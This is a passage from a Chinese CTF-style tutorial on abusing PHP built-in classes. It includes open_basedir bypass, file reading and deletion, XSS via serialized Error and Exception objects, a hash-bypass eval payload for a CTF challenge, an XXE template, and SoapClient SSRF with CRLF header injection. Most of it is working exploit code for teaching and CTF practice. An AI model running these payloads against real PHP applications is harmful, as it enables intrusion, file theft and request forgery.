title="绕过open_basedir"></a>绕过open_basedir</h4><p>open_basedir限制目录：将PHP所能打开的文件限制在指定目录树，包括文件本身</p><p>使用DirectoryIterator()和FilesystemIterator的glob:&#x2F;&#x2F;协议可以无视open_basedir对目录的限制，可以用来列举出指定目录下的文件，使用GlobIterator也是一样的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;指定目录&#x27;</span>)；</span><br><span class="line"><span class="variable">$dir1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir1</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$dir2</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;2&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir2</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject()"></a>SplFileObject()</h4><p>利用SplFileObject()进行文件内容的读取</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641631513ab3.png" alt="image-20240313200156343"></p><p>php文件要到源码中查看（ctrl U）</p><p>同理 没有foeach则只回显一行</p><p>绝对路径也可</p><p>也可：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$k</span> -&gt;<span class="variable">$line</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">key</span>()+<span class="number">1</span>).<span class="string">&#x27;:&#x27;</span>.<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">current</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ZipArchive"><a href="#ZipArchive" class="headerlink" title="ZipArchive()"></a>ZipArchive()</h4><p>利用ZipArchive()进行文件删除</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641631676f9c.png" alt="image-20240313204731187"></p><p>文件已删除</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> - <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;test.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>删除了test.zip文件，</p><p>ZipArchive::OVERWRITE：总是以一个新的压缩包开始，在此模式下如果已经存在则会被覆盖，这是一个常数项，值为8</p><h4 id="ReflectionMethod"><a href="#ReflectionMethod" class="headerlink" title="ReflectionMethod"></a>ReflectionMethod</h4><p>利用ReflectionMethod获取注释的内容</p><p>(PHP 5 &gt;&#x3D; 5.1.0, PHP 7, PHP 8)</p><p>ReflectionFunctionAbstract::getDocComment — 获取注释内容<br>由该原生类中的getDocComment方法可以访问到注释的内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span> = <span class="string">&#x27;orange&#x27;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    this is DocComment</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">type</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Apple&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ref</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="string">&quot;Apple&quot;</span>,<span class="string">&quot;type&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ref</span>-&gt;<span class="title function_ invoke__">getDocComment</span>());</span><br></pre></td></tr></table></figure><p>注释文本需符合&#x2F;**开头的规范否则无法识别</p><p><img src="https://bu.dusays.com/2024/05/13/66416315510f1.png" alt="image-20240313210010722"></p><p>ReflectionMethod(“Apple”,”type”);</p><p>在Apple类中type方法前的注释</p><h4 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h4><p><strong>Error</strong> 是所有PHP内部错误类的基类。 (PHP 7, 8)</p><p>在开启报错的情况下</p><p>**Error::__toString ** error 的字符串表达</p><p>类属性</p><ul><li>message 错误消息内容</li><li>code 错误代码</li><li>file 抛出错误的文件名</li><li>line 抛出错误的行数</li></ul><p>Error内置有一个__toString()的方法，可以产生<strong>xss</strong>漏洞</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>将第二个输出结果赋值给第一个代码的a</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313210909018.png" alt="image-20240313210909018"></p><p>返回 Error 的 string表达形式。</p><p><img src="https://bu.dusays.com/2024/05/13/6641631128b49.png" alt="image-20240313211614294"></p><h4 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h4><p>Exception与Error同理</p><p><strong>Exception</strong>是所有用户级异常的基类。 (PHP 5, 7, 8)</p><p>**Exception::__toString ** 将异常对象转换为字符串</p><p>类属性</p><ul><li>message 错误消息内容</li><li>code 错误代码</li><li>file 抛出错误的文件名</li><li>line 抛出错误的行数</li></ul><p>同样也有<strong>xss</strong>漏洞</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;text&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>同样将2赋值给1</p><p><img src="https://bu.dusays.com/2024/05/13/664163139aa2d.png" alt="image-20240313211434419"></p><p>返回转换为字符串（string）类型的异常。</p><p><img src="https://bu.dusays.com/2024/05/13/664163197c706.png" alt="image-20240313211519361"></p><h4 id="绕hash"><a href="#绕hash" class="headerlink" title="绕hash"></a>绕hash</h4><p>利用Error和Exception</p><p>先看一下输出</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">3</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">4</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641630dad872.png" alt="image-20240313212715298"></p><blockquote><p>Error: payload in &#x2F;box&#x2F;script.php:2<br>Stack trace:<br>#0 {main}<br>Error: payload in &#x2F;box&#x2F;script.php:3<br>Stack trace:<br>#0 {main}<br>Exception: payload in &#x2F;box&#x2F;script.php:4<br>Stack trace:<br>#0 {main}<br>Exception: payload in &#x2F;box&#x2F;script.php:6<br>Stack trace:<br>#0 {main}</p></blockquote><p>两个编译器编译后 对比发现这两个原生类返回的信息除了行号一模一样</p><p>利用这点，我们可以尝试进行hash函数的绕过，需要注意的是，必须将两个传入的对象放到同一行</p><p>因此我们可以进行简单的测试,发现使用此方法可以绕过hash强(弱)函数比较</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!=<span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$a不等于$b&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5值相等\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sha1值相等&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313213054499.png" alt="image-20240313213054499"></p><p>没有问题</p><p>例：</p><p>[2020 极客大挑战]Greatphp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line"> </span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line"> </span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line"> </span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line"> </span><br><span class="line">           &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;&#125;<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><p>需要绕过两个hash强比较，且最终需要构造eval代码执行</p><p>显然正常方法是行不通的，而通过原生类可进行绕过</p><p>同样，当md5()和sha1()函数处理对象时，会自动调用__tostring方法</p><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line"> </span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line"> </span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">          </span><br><span class="line"> </span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">  &#125;&#125;<span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;<span class="comment">//两次取反绕过正则$a=new Error($str,1);</span></span><br><span class="line"> </span><br><span class="line">  <span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();<span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;<span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h4><p>SimpleXMLElement可解析XML 文档中的元素。 （PHP 5、PHP 7、PHP 8）</p><p>利用实例化该类的对象来传入xml代码进行<strong>xxe</strong>攻击，进而读取文件内容和命令执行</p><p>SimpleXMLElement::__construct — 创建一个新的 SimpleXMLElement 对象</p><p>参数：<br><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313213919494.png" alt="image-20240313213919494"></p><p>根据官方文档，发现当第三个参数为True时，即可实现远程xml文件载入，第二个参数的常量值设置为2即可。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;url&quot;&gt;%remote;]&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;xee&lt;/x&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$xml_clss</span>=<span class="keyword">new</span> <span class="title class_">SimpleXMLElement</span>(<span class="variable">$xml</span>,LIBXML_NOENT);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$xml_class</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>LIBXML_NOENT也是一个常数</p><p>参考赛题：[SUCTF 2018]Homework</p><h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p>SoapClient是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端，可以创建soap数据报文，与wsdl接口进行交互</p><p>soap：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SOAP 是基于 XML 的简易协议，是用在分散或分布的环境中交换信息的简单的协议，可使应用程序在 HTTP 之上进行信息交换</span><br><span class="line"> </span><br><span class="line">SOAP是webService三要素（SOAP、WSDL、UDDI）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。</span><br><span class="line"> </span><br><span class="line">其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</span><br></pre></td></tr></table></figure><p>soap扩展模块默认关闭，使用时需手动开启,php.ini配置文件里面开启extension&#x3D;php_soap.dll选项</p><p>SoapClient::__call —调用 SOAP 函数 (PHP 5, 7, 8)</p><p>通常，SOAP 函数可以作为SoapClient对象的方法调用</p><p>由此 可利用这个类进行ssrf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</span><br><span class="line"> </span><br><span class="line">第一个参数是用来指明是否是wsdl模式，如果为`null`，那就是非wsdl模式。</span><br><span class="line"> </span><br><span class="line">第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</span><br></pre></td></tr></table></figure><p>由此：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://xxx.xxx.xxx:3333/index.php&#x27;</span>, </span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;uri&#x27;</span> =&gt;<span class="string">&#x27;http://xxx.xxx.xxx:3333&#x27;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;111111&#x27;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();<span class="comment">//$c-&gt;nofun(); </span></span><br><span class="line"><span class="comment">//随便调用对象中不存在的方法，触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313220612243.png" alt="image-20240313220612243"></p><p>监听：</p><p><img src="https://bu.dusays.com/2024/05/13/6641631112ba6.png" alt="image-20240313220643842"></p><p>可以看到 SOAPAction和user_agent都可控</p><p>本地测试时发现，当使用此内置类(即soap协议)请求存在服务的端口时，会立即报错，而去访问不存在服务(未占用)的端口时，会等待一段时间报错，可以以此进行内网资产的探测。</p><p>同时还可以配合CRLF漏洞</p><p>可以通过 SoapClient 来控制其他参数或者post发送数据。例如:HTTP协议去攻击Redis</p><blockquote><p>CRLF：</p><p>HTTP报文的结构：状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。<br>CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。<br>攻击者一旦向请求行或首部中的字段注入恶意的CRLF(\r\n)，就能注入一些首部字段或报文主体，并在响应中输出。</p></blockquote><p>通过结合CRLF，我们利用SoapClient+CRLF便可以干更多的事情，例如插入自定义Cookie，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://47.102.146.95:2333&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt;<span class="string">&#x27;uri&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;111111\r\nCookie: PHPSESSION=dasdasd564d6as4d6a&quot;</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$b</span>;<span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313220940648.png" alt="image-20240313220940648"></p><p>发送POST的数据包，这里需要将Content-Type设置为application&#x2F;x-www-form-urlencoded，我们可以通过<strong>添加两个\r\n来将原来的Content-Type挤下去，自定义一个新的Content-Type</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://47.102.146.95:2333&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt;<span class="string">&#x27;uri&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;111111\r\nContent-Type: application/x-www-form-urlencoded\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: PHPSESSID=3stu05dr969ogmprk28drnju93\r\nContent-Length: 10\r\n\r\npostdata&quot;</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$b</span>;<span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641631747fd8.png" alt="image-20240313221037193"></p><p>参考赛题：ctfshow上的题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line"> </span><br><span class="line">array_pop($xff);</span><br><span class="line"> </span><br><span class="line">$ip = array_pop($xff); //获取xff头</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if($ip!==&#x27;127.0.0.1&#x27;)&#123;</span><br><span class="line"> </span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line"> </span><br><span class="line">&#125;else&#123;</span><br><span class="line"> </span><br><span class="line">    $token = $_POST[&#x27;token&#x27;];</span><br><span class="line"> </span><br><span class="line">    if($token==&#x27;ctfshow&#x27;)&#123;</span><br><span class="line"> </span><br><span class="line">        file_put_contents(&#x27;flag.txt&#x27;,$flag);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;</span>.<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span 